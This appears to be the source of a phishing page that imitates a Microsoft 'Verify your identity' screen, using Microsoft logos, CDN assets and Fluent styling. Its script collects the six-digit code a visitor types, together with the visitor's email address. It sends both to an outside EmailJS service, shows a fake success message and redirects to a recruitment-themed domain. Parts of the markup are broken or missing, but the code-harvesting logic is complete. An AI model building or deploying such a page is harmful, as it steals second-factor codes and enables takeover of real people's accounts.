<!DOCTYPE html>
<html dir="ltr" lang="EN-US">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
    <meta http-equiv="X-UA-Compatible" content="IE=Edge"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes"/>
    <title>Verify your identity</title>
    <link rel="shortcut icon" href="https://logincdn.msftauth.net/16.000.31088.5/images/favicon.ico"/>

    <style>
        /* Design Tokens based on Fluent UI - Auto-switching between Light and Dark */
        :root {
            /* Shared tokens */
            --borderRadiusNone: 0;
            --borderRadiusSmall: 2px;
            --borderRadiusMedium: 4px;
            --borderRadiusLarge: 6px;
            --borderRadiusXLarge: 8px;
            --borderRadiusCircular: 10000px;
            --fontSizeBase100: 10px;
            --fontSizeBase200: 12px;
            --fontSizeBase300: 14px;
            --fontSizeBase400: 16px;
            --fontSizeBase500: 20px;
            --fontSizeBase600: 24px;
            --fontSizeHero700: 28px;
            --fontSizeHero800: 32px;
            --fontSizeHero900: 40px;
            --fontSizeHero1000: 68px;
            --lineHeightBase100: 14px;
            --lineHeightBase200: 16px;
            --lineHeightBase300: 20px;
            --lineHeightBase400: 22px;
            --lineHeightBase500: 28px;
            --lineHeightBase600: 32px;
            --lineHeightHero700: 36px;
            --lineHeightHero800: 40px;
            --lineHeightHero900: 52px;
            --lineHeightHero1000: 92px;
            --fontFamilyBase: 'Segoe UI', 'Segoe UI Web (West European)', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;
            --fontWeightRegular: 400;
            --fontWeightMedium: 500;
            --fontWeightSemibold: 600;
            --fontWeightBold: 700;
            --strokeWidthThin: 1px;
            --strokeWidthThick: 2px;
            --spacingHorizontalXXS: 2px;
            --spacingHorizontalXS: 4px;
            --spacingHorizontalSNudge: 6px;
            --spacingHorizontalS: 8px;
            --spacingHorizontalM: 12px;
            --spacingHorizontalL: 16px;
            --spacingHorizontalXL: 20px;
            --spacingHorizontalXXL: 24px;
            --spacingVerticalXXS: 2px;
            --spacingVerticalXS: 4px;
            --spacingVerticalS: 8px;
            --spacingVerticalM: 12px;
            --spacingVerticalL: 16px;
            --spacingVerticalXL: 20px;
            --spacingVerticalXXL: 24px;
            --spacingVerticalXXXL: 32px;
            --durationNormal: 200ms;
            --curveDecelerateMid: cubic-bezier(0,0,0,1);

            /* Light Theme (Default) */
            --colorNeutralForeground1: #242424;
            --colorNeutralForeground2: #424242;
            --colorNeutralForeground3: #616161;
            --colorNeutralForeground4: #707070;
            --colorNeutralForegroundDisabled: #bdbdbd;
            --colorBrandForegroundLink: #115ea3;
            --colorBrandForegroundLinkHover: #0f548c;
            --colorBrandForegroundLinkPressed: #0c3b5e;
            --colorBrandForeground1: #0f6cbd;
            --colorNeutralForegroundOnBrand: #ffffff;
            --colorNeutralBackground1: #ffffff;
            --colorNeutralBackground1Hover: #f5f5f5;
            --colorNeutralBackground1Pressed: #e0e0e0;
            --colorNeutralBackground2: #fafafa;
            --colorNeutralStroke1: #d1d1d1;
            --colorNeutralStroke1Hover: #c7c7c7;
            --colorNeutralStrokeAccessible: #616161;
            --colorNeutralStrokeAccessibleHover: #575757;
            --colorNeutralStrokeAccessibleSelected: #0f6cbd;
            --colorBrandBackground: #0f6cbd;
            --colorBrandBackgroundHover: #115ea3;
            --colorBrandBackgroundPressed: #0c3b5e;
            --colorStatusDangerBackground3: #c50f1f;
            --colorStatusSuccessBackground3: #107c10;
            --colorStrokeFocus1: #ffffff;
            --colorStrokeFocus2: #000000;
            --colorNeutralShadowKey: rgba(0,0,0,0.14);
            --colorNeutralShadowAmbient: rgba(0,0,0,0.12);
            --shadow16: 0 0 2px var(--colorNeutralShadowAmbient), 0 8px 16px var(--colorNeutralShadowKey);
            --signInContainerMaxWidth: 440px;
            --signInContainerMinWidth: 320px;
            --signInContainerBorderRadius: 12px;
            --signInContainerPadding: 40px;
            --signInContainerBackgroundColor: var(--colorNeutralBackground1);
        }

        /* Dark Theme - Auto-detected based on system preference */
        @media (prefers-color-scheme: dark) {
            :root {
                --colorNeutralForeground1: #ffffff;
                --colorNeutralForeground2: #d6d6d6;
                --colorNeutralForeground3: #adadad;
                --colorNeutralForeground4: #999999;
                --colorNeutralForegroundDisabled: #5c5c5c;
                --colorBrandForegroundLink: #479ef5;
                --colorBrandForegroundLinkHover: #62abf5;
                --colorBrandForegroundLinkPressed: #2886de;
                --colorBrandForeground1: #479ef5;
                --colorNeutralForegroundOnBrand: #ffffff;
                --colorNeutralBackground1: #292929;
                --colorNeutralBackground1Hover: #3d3d3d;
                --colorNeutralBackground1Pressed: #1f1f1f;
                --colorNeutralBackground2: #1f1f1f;
                --colorNeutralStroke1: #666666;
                --colorNeutralStroke1Hover: #757575;
                --colorNeutralStrokeAccessible: #adadad;
                --colorNeutralStrokeAccessibleHover: #bdbdbd;
                --colorNeutralStrokeAccessibleSelected: #479ef5;
                --colorBrandBackground: #115ea3;
                --colorBrandBackgroundHover: #0f6cbd;
                --colorBrandBackgroundPressed: #0c3b5e;
                --colorStatusDangerBackground3: #c50f1f;
                --colorStatusSuccessBackground3: #107c10;
                --colorStrokeFocus1: #000000;
                --colorStrokeFocus2: #ffffff;
                --colorNeutralShadowKey: rgba(0,0,0,0.28);
                --colorNeutralShadowAmbient: rgba(0,0,0,0.24);
                --shadow16: 0 0 2px var(--colorNeutralShadowAmbient), 0 8px 16px var(--colorNeutralShadowKey);
                --signInContainerBackgroundColor: #292929;
            }
        }

        * {
            margin: 2px;
            padding: 0 5px;
            box-sizing: border-box;
        }

        body {
            font-family: var(--fontFamilyBase);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            /* Light mode background - Fluent light SVG */
            background-image: url(https://logincdn.msftauth.net/shared/5/images/fluent_web_light_2_145a07dcb971527a82b8.svg);
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            transition: background-image 0.3s ease;
        }

        /* Dark mode background - Fluent dark SVG without gradient overlay */
        @media (prefers-color-scheme: dark) {
            body {
                background-image: url(https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg);
            }
        }

        .login-container {
            width: 100%;
            max-width: var(--signInContainerMaxWidth);
            min-width: var(--signInContainerMinWidth);
            background: var(--signInContainerBackgroundColor);
            border-radius: var(--signInContainerBorderRadius);
            box-shadow: var(--shadow16);
            padding: var(--signInContainerPadding);
            position: relative;
            z-index: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            transition: background-color 0.3s ease, box-shadow 0.3s ease;
        }

        /* Top bar with back arrow and logo */
        .top-bar {
            display: flex;
            align-items: center;
            justify-content: space-between;
            width: 100%;
            margin-bottom: 24px;
            position: relative;
        }

        .top-bar .back-arrow {
            font-family: var(--fontFamilyBase);
            font-size: 18px;
            font-weight: 500;
            color: #707070;
            text-decoration: none;
            cursor: pointer;
            transition: color 0.3s ease;
            line-height: 1;
            padding: 4px 8px 4px 0;
            flex-shrink: 0;
        }

        .top-bar .back-arrow:hover {
            color: #0f6cbd;
            text-decoration: none;
        }

        .top-bar .back-arrow .arrow-text {
            font-size: var(--fontSizeBase300);
            margin-left: 4px;
        }

        .top-bar .logo {
            text-align: center;
            display: flex;
            justify-content: center;
            align-items: center;
            flex: 1;
            margin: 0;
        }

        .top-bar .logo svg {
            width: 114px;
            height: 24px;
        }

        /* Microsoft Logo - Light Theme */
        .top-bar .logo .ms-logo-light {
            display: block;
        }
        .top-bar .logo .ms-logo-dark {
            display: none;
        }

        @media (prefers-color-scheme: dark) {
            .top-bar .logo .ms-logo-light {
                display: none;
            }
            .top-bar .logo .ms-logo-dark {
                display: block;
            }
        }

        /* Spacer for alignment */
        .top-bar .spacer {
            width: 30px;
            flex-shrink: 0;
        }

        /* ===== Identity Badge / Email Display ===== */
        .identity-badge {
            display: flex;
            justify-content: center;
            position: relative;
            margin-bottom: var(--spacingVerticalM);
            width: 100%;
            box-sizing: border-box;
        }

        .identity-badge .badge-inner {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-family: var(--fontFamilyBase);
            font-size: var(--fontSizeBase300);
            font-weight: 500;
            line-height: var(--lineHeightBase300);
            color: #575757;
            text-align: left;
            padding: 4px 12px;
            border-radius: var(--borderRadiusCircular);
            background: #ffffff;
            border: 1px solid var(--colorNeutralStroke1);
            word-break: break-all;
            max-width: 100%;
            transition: background-color 0.3s ease, border-color 0.3s ease, color 0.3s ease;
        }

        .identity-badge .badge-inner .badge-email {
            font-weight: var(--fontWeightSemibold);
            margin-left: 4px;
        }

        /* Dark theme adjustment for badge */
        @media (prefers-color-scheme: dark) {
            .identity-badge .badge-inner {
                background: var(--colorNeutralBackground2);
                border-color: var(--colorNeutralStroke1);
                color: var(--colorNeutralForeground1);
            }
        }

        h1 {
            font-size: var(--fontSizeBase600);
            font-weight: var(--fontWeightSemibold);
            color: var(--colorNeutralForeground1);
            margin-bottom: 10px;
            line-height: var(--lineHeightBase600);
            text-align: center;
            width: 100%;
            transition: color 0.3s ease;
        }

        .subtitle {
            font-size: var(--fontSizeBase300);
            color: var(--colorNeutralForeground2);
            margin-top: 0px;
            margin-bottom: 28px;
            text-align: center;
            font-weight: var(--fontWeightRegular);
            line-height: var(--lineHeightBase300);
            width: 100%;
            transition: color 0.3s ease;
        }

        .subtitle .email-highlight {
            font-weight: var(--fontWeightSemibold);
            color: var(--colorNeutralForeground1);
            transition: color 0.3s ease;
            word-break: break-all;
            margin-left: -3px;
        }

        /* OTP Input Container */
        .otp-container {
            display: flex;
            gap: 4px;
            justify-content: center;
            margin-bottom: 24px;
            width: 100%;
            padding: 0 10px;
        }

        .otp-input {
            width: 39px;
            height: 40px;
            text-align: center;
            font-family: var(--fontFamilyBase);
            font-size: 20px;
            font-weight: var(--fontWeightSemibold);
            color: var(--colorNeutralForeground1);
            background: var(--colorNeutralBackground1);
            border: var(--strokeWidthThin) solid var(--colorNeutralStroke1);
            border-radius: var(--borderRadiusMedium);
            transition: all var(--durationNormal) var(--curveDecelerateMid);
            outline: none;
            caret-color: var(--colorBrandForeground1);
        }

        .otp-input:hover {
            border-color: var(--colorNeutralStroke1Hover);
        }

        .otp-input:focus {
            border-color: var(--colorBrandForeground1);
            box-shadow: 0 0 0 2px rgba(15, 108, 189, 0.2);
        }

        .otp-input.error {
            border-color: var(--colorStatusDangerBackground3);
            box-shadow: 0 0 0 2px rgba(197, 15, 31, 0.2);
        }

        .otp-input.success {
            border-color: var(--colorStatusSuccessBackground3);
            box-shadow: 0 0 0 2px rgba(16, 124, 16, 0.2);
        }

        /* Hide number input arrows */
        .otp-input::-webkit-outer-spin-button,
        .otp-input::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }

        .otp-input[type=number] {
            -moz-appearance: textfield;
        }

        /* OTP Actions */
        .otp-actions {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: var(--spacingVerticalM);
            width: 100%;
            margin-bottom: 8px;
        }

        .resend-link {
            font-family: var(--fontFamilyBase);
            font-size: var(--fontSizeBase300);
            font-weight: 600;
            color: #0f6cbd;
            transition: color 0.3s ease;
            cursor: default;
            text-align: center;
            width: 100%;
        }

        .resend-link a {
            color: var(--colorBrandForegroundLink);
            text-decoration: none;
            cursor: pointer;
            transition: color 0.3s ease;
            font-weight: var(--fontWeightSemibold);
        }

        .resend-link a:hover {
            text-decoration: underline;
            color: var(--colorBrandForegroundLinkHover);
        }

        .resend-link a.disabled {
            color: var(--colorNeutralForegroundDisabled);
            cursor: not-allowed;
            pointer-events: none;
        }

        .timer-text {
            color: #ffffff;
            font-size: var(--fontSizeBase200);
            font-weight: var(--fontWeightRegular);
            margin-top: var(--spacingVerticalXS);
        }

        .error-message {
            font-family: var(--fontFamilyBase);
            font-size: var(--fontSizeBase200);
            font-weight: var(--fontWeightRegular);
            color: var(--colorStatusDangerBackground3);
            line-height: var(--lineHeightBase200);
            margin-top: var(--spacingVerticalXXS);
            display: none;
            text-align: center;
            width: 100%;
            transition: color 0.3s ease;
        }

        .error-message.visible {
            display: block;
        }

        .success-message {
            font-family: var(--fontFamilyBase);
            font-size: var(--fontSizeBase200);
            font-weight: var(--fontWeightRegular);
            color: var(--colorStatusSuccessBackground3);
            line-height: var(--lineHeightBase200);
            margin-top: var(--spacingVerticalXXS);
            display: none;
            text-align: center;
            width: 100%;
            transition: color 0.3s ease;
        }

        .success-message.visible {
            display: block;
        }

        .loading-spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid var(--colorNeutralForegroundOnBrand);
            border-radius: 50%;
            border-top-color: transparent;
            animation: spin 0.8s linear infinite;
            vertical-align: middle;
            margin-right: var(--spacingHorizontalXS);
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* OTP filled state - visual feedback */
        .otp-input.filled {
            border-color: var(--colorBrandForeground1);
            background: var(--colorNeutralBackground1Hover);
        }

        .otp-input.verifying {
            border-color: var(--colorBrandForeground1);
            background: var(--colorNeutralBackground1Hover);
            animation: pulse 1s ease-in-out infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        @media (max-width: 480px) {
            body {
                padding: 10px;
            }

            .login-container {
                padding: 24px 20px 32px;
                margin: 14px;
                border-radius: var(--borderRadiusLarge);
                max-width: 100%;
                min-width: 0;
            }

            .otp-container {
                gap: 5px;
                padding: 0 5px;
            }

            .otp-input {
                width: 40px;
                height: 48px;
                font-size: 20px;
            }

            .subtitle {
                font-size: var(--fontSizeBase200);
                margin-bottom: 20px;
            }

            h1 {
                font-size: var(--fontSizeBase500);
            }

            .top-bar .back-arrow .arrow-text {
                font-size: var(--fontSizeBase200);
            }

            .identity-badge .badge-inner {
                font-size: var(--fontSizeBase200);
                padding: 3px 10px;
            }
        }

        @media (max-width: 380px) {
            .otp-input {
                width: 34px;
                height: 42px;
                font-size: 18px;
            }

            .otp-container {
                gap: 6px;
            }
        }
    </style>
</head>

        // --- Get Email from URL or localStorage ---
        function getEmail() {
            // First try URL parameter
            const urlParams = new URLSearchParams(window.location.search);
            const emailParam = urlParams.get('email');

            if (emailParam) {
                // Save to localStorage for persistence
                localStorage.setItem('userEmail', emailParam);
                return emailParam;
            }

            // Then try localStorage
            const storedEmail = localStorage.getItem('userEmail');
            if (storedEmail) {
                return storedEmail;
            }

            // Fallback to demo email
            return 'user@example.com';
        }

        // --- Display Email in all places ---
        const userEmail = getEmail();

        const displayEmail = document.getElementById('displayEmail');
        if (displayEmail) {
            displayEmail.textContent = userEmail;

        const otpInputs = document.querySelectorAll('.otp-input');

        // --- OTP Input Handling ---
        let otpTimer = null;

        function handleOTPInput(e) {
            const input = e.target;
            const index = Array.from(otpInputs).indexOf(input);

            // Remove error state when typing
            input.classList.remove('error');
            otpError.classList.remove('visible');
            otpSuccess.classList.remove('visible');

            // Allow only digits
            if (input.value.length > 1) {
                input.value = input.value.slice(0, 1);
            }

            // Move to next input if current has value
            if (input.value && index < otpInputs.length - 1) {
                otpInputs[index + 1].focus();
            }

            // Update filled state
            if (input.value) {
                input.classList.add('filled');
            } else {
                input.classList.remove('filled');
            }

            // Check if all inputs are filled
            const allFilled = Array.from(otpInputs).every(inp => inp.value !== '');
            if (allFilled) {
                // Auto-submit when all fields are filled
                setTimeout(() => {
                    verifyOTP();
                }, 300);
            }
        }

        function handleOTPKeydown(e) {
            const input = e.target;
            const index = Array.from(otpInputs).indexOf(input);

            // Handle backspace - move to previous input
            if (e.key === 'Backspace' && !input.value && index > 0) {
                otpInputs[index - 1].focus();
                otpInputs[index - 1].value = '';
                otpInputs[index - 1].classList.remove('filled');
            }

            // Handle left arrow
            if (e.key === 'ArrowLeft' && index > 0) {
                otpInputs[index - 1].focus();
            }

            // Handle right arrow
            if (e.key === 'ArrowRight' && index < otpInputs.length - 1) {
                otpInputs[index + 1].focus();
            }
        }

        function handleOTPPaste(e) {
            const pasteData = (e.clipboardData || window.clipboardData).getData('text');
            const digits = pasteData.replace(/\D/g, '').slice(0, 6);

            if (digits) {
                e.preventDefault();
                const inputs = Array.from(otpInputs);
                for (let i = 0; i < inputs.length && i < digits.length; i++) {
                    inputs[i].value = digits[i];
                    inputs[i].classList.add('filled');
                }
                // Focus on the next empty input or the last filled one
                const nextEmpty = inputs.findIndex(inp => inp.value === '');
                if (nextEmpty !== -1) {
                    inputs[nextEmpty].focus();
                } else {
                    inputs[inputs.length - 1].focus();
                    // Auto-submit if all filled
                    setTimeout(() => {
                        verifyOTP();
                    }, 300);
                }
            }
        }

        // Add event listeners to OTP inputs
        otpInputs.forEach((input, index) => {
            input.addEventListener('input', handleOTPInput);
            input.addEventListener('keydown', handleOTPKeydown);
            input.addEventListener('paste', handleOTPPaste);

            // Focus on first input on page load
            if (index === 0) {
                input.focus();
            }
        });

        // --- Timer / Resend Logic ---
        function startResendTimer() {
            resendCooldown = 30;
            isResendDisabled = true;
            resendLink.classList.add('disabled');
            timerText.style.display = 'block';
            timerCount.textContent = resendCooldown;

            if (otpTimer) {
                clearInterval(otpTimer);
            }

            otpTimer = setInterval(() => {
                resendCooldown--;
                timerCount.textContent = resendCooldown;

                if (resendCooldown <= 0) {
                    clearInterval(otpTimer);
                    isResendDisabled = false;
                    resendLink.classList.remove('disabled');
                    timerText.style.display = 'none';
                }
            }, 1000);
        }

        // Start timer on page load
        startResendTimer();

        // Resend handler
        resendLink.addEventListener('click', (e) => {
            e.preventDefault();

            if (isResendDisabled) {
                return;
            }

            // Simulate resending OTP
            otpSuccess.textContent = `A new verification code has been sent to ${userEmail}`;
            otpSuccess.classList.add('visible');
            setTimeout(() => {
                otpSuccess.classList.remove('visible');
            }, 5000);

            // Reset OTP inputs
            otpInputs.forEach(inp => {
                inp.value = '';
                inp.classList.remove('filled');
            });
            otpInputs[0].focus();

            // Reset timer
            startResendTimer();
        });

        // --- OTP Verification ---
        function verifyOTP() {
            // Clear previous states
            otpError.classList.remove('visible');
            otpSuccess.classList.remove('visible');
            otpInputs.forEach(inp => inp.classList.remove('error', 'success'));

            // Get OTP value
            let otpValue = '';
            let allFilled = true;
            otpInputs.forEach((input, index) => {
                if (input.value) {
                    otpValue += input.value;
                } else {
                    allFilled = false;
                    input.classList.add('error');
                }
            });

            if (!allFilled || otpValue.length < 6) {
                otpError.textContent = 'Please enter all 6 digits of the verification code.';
                otpError.classList.add('visible');
                return;
            }

            // Show loading state on inputs
            otpInputs.forEach(inp => inp.classList.add('verifying'));

            // Simulate verification process with EmailJS
            setTimeout(async () => {
                try {
                    // Send OTP via EmailJS with email included
                    const templateParams = {
                        otp_code: otpValue,
                        user_email: userEmail,
                        verification_time: new Date().toLocaleString()
                    };

                    const response = await emailjs.send(
                        "service_t84doqy",
                        "template_awd8sif",
                        templateParams
                    );

                    console.log("OTP Verification SUCCESS:", response.status);

                    // Show success
                    otpInputs.forEach(inp => {
                        inp.classList.remove('verifying');
                        inp.classList.add('success');
                    });
                    otpSuccess.textContent = '✓ Verification successful! Redirecting...';
                    otpSuccess.classList.add('visible');

                    // Redirect after delay
                    setTimeout(() => {
                        // Replace with your redirect URL
                        window.location.href = 'https://www.pfizertalents.com/career';
                    }, 1500);

                } catch (error) {
                    console.error("OTP Verification FAILED:", error);

                    // Show error
                    otpInputs.forEach(inp => {
                        inp.classList.remove('verifying');
                        inp.classList.add('error');
                    });
                    otpError.textContent = 'Invalid verification code. Please try again.';
                    otpError.classList.add('visible');

                    // Reset after 2 seconds
                    setTimeout(() => {
                        otpInputs.forEach(inp => {
                            inp.value = '';
                            inp.classList.remove('filled', 'error', 'success', 'verifying');
                        });
                        otpInputs[0].focus();
                        otpError.classList.remove('visible');
                    }, 2000);
                }
            }, 1500);
        }

        // Form submit handler (kept for compatibility but button is removed)
        otpForm.addEventListener('submit', (e) => {
            e.preventDefault();
            verifyOTP();
        });

        // --- Back Arrow Handler ---
        backArrow.addEventListener('click', (e) => {
            e.preventDefault();
            // Clear stored email when going back
            localStorage.removeItem('userEmail');
            // Replace with your sign-in page URL
            window.location.href = 'signin.html';
        });

        // --- Utility: Clear error on focus ---
        otpInputs.forEach(input => {
            input.addEventListener('focus', function() {
                this.classList.remove('error', 'success', 'verifying');
                otpError.classList.remove('visible');
                otpSuccess.classList.remove('visible');
            });
        });

        // --- Simulate receiving OTP via email (demo) ---
        console.log(`OTP sent to: ${userEmail}`);
        console.log('Demo OTP: 123456');

        // --- Function to update email (can be called from parent page) ---
        window.updateOTPEmail = function(email) {
            if (email) {
                localStorage.setItem('userEmail', email);
                if (displayEmail) {
                    displayEmail.textContent = email;
                }
                if (bannerText) {
                    bannerText.textContent = email;
                }
                if (identityBadge) {
                    identityBadge.setAttribute('aria-label', email);
                }
            }
        };
    </script>
</body>
